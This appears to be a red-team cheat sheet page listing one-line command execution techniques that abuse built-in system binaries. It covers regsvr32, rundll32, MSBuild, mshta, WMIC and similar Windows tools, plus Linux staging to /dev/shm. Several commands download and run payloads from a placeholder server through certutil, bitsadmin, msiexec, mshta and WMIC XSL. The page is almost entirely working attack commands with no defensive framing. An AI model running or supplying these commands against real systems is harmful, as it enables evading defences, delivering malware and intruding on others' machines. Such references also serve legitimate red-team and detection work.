# LOLBin & Local Execution

One-line execution primitives for payloads or scripts already available on the target.

<div class="ol-section-kicker"><span>RT</span><strong>Execution</strong></div>

## regsvr32 local scriptlet

```cmd
regsvr32.exe /s /u /i:payload.sct scrobj.dll
```

**Tool:** regsvr32 · **Platform:** Windows · **Tags:** Scriptlet, LOLBin, Proxy Execution · **Context:** User

## rundll32 DLL export

```cmd
rundll32.exe payload.dll,EntryPoint
```

**Tool:** rundll32 · **Platform:** Windows · **Tags:** DLL, LOLBin, Execution · **Context:** User

## InstallUtil uninstall path

```cmd
InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

**Tool:** InstallUtil · **Platform:** Windows · **Tags:** .NET, LOLBin, Execution · **Context:** User

## MSBuild project execution

```cmd
MSBuild.exe payload.xml
```

**Tool:** MSBuild · **Platform:** Windows · **Tags:** MSBuild, LOLBin, Execution · **Context:** User

## ODBCConf DLL registration

```cmd
odbcconf.exe /S /A {REGSVR payload.dll}
```

**Tool:** odbcconf · **Platform:** Windows · **Tags:** DLL, LOLBin, Execution · **Context:** User

## Decode base64 to tmpfs

```bash
printf '%s' '<BASE64>' | base64 -d > /dev/shm/.p && chmod +x /dev/shm/.p
```

**Tool:** base64 · **Platform:** Linux · **Tags:** Decode, tmpfs, Staging · **Context:** User

## Execute Python from stdin

```bash
python3 -c "exec(open('/dev/stdin').read())" < payload.py
```

**Tool:** Python · **Platform:** Linux/macOS · **Tags:** Python, stdin, Execution · **Context:** User


## mshta local HTA
```cmd
mshta.exe payload.hta
```
**Tool:** mshta · **Platform:** Windows · **Tags:** HTA, LOLBin, Execution · **Context:** User

## mshta remote HTA
```cmd
mshta.exe https://<SERVER>/payload.hta
```
**Tool:** mshta · **Platform:** Windows · **Tags:** HTA, Remote, LOLBin · **Context:** User

## certutil download
```cmd
certutil.exe -urlcache -split -f https://<SERVER>/payload.exe payload.exe
```
**Tool:** certutil · **Platform:** Windows · **Tags:** Download, LOLBin · **Context:** User

## bitsadmin transfer
```cmd
bitsadmin /transfer job /download /priority high https://<SERVER>/payload.exe C:\Windows\Tasks\payload.exe
```
**Tool:** bitsadmin · **Platform:** Windows · **Tags:** BITS, Download · **Context:** User

## curl.exe download
```cmd
curl.exe -fsSL https://<SERVER>/payload.exe -o payload.exe
```
**Tool:** curl.exe · **Platform:** Windows · **Tags:** Download, Native · **Context:** User

## msiexec remote package
```cmd
msiexec.exe /i https://<SERVER>/payload.msi /quiet
```
**Tool:** msiexec · **Platform:** Windows · **Tags:** MSI, LOLBin · **Context:** User

## WMIC XSL processing
```cmd
wmic.exe os get /format:"https://<SERVER>/payload.xsl"
```
**Tool:** WMIC · **Platform:** Windows · **Tags:** XSL, LOLBin · **Context:** User

## forfiles command invocation
```cmd
forfiles /p C:\Windows /m notepad.exe /c "cmd /c whoami"
```
**Tool:** forfiles · **Platform:** Windows · **Tags:** Proxy Execution, LOLBin · **Context:** User

## pcalua process launch
```cmd
pcalua.exe -a cmd.exe -d C:\Windows\System32
```
**Tool:** pcalua · **Platform:** Windows · **Tags:** Proxy Execution, LOLBin · **Context:** User

## SyncAppvPublishingServer PowerShell expression
```powershell
SyncAppvPublishingServer.exe "n; Start-Process cmd.exe"
```
**Tool:** SyncAppvPublishingServer · **Platform:** Windows · **Tags:** App-V, LOLBin · **Context:** User


---

**Related:** [Overview](./) · [Lateral Movement](lateral-movement.md) · [Reverse Shells](reverse-shells.md)
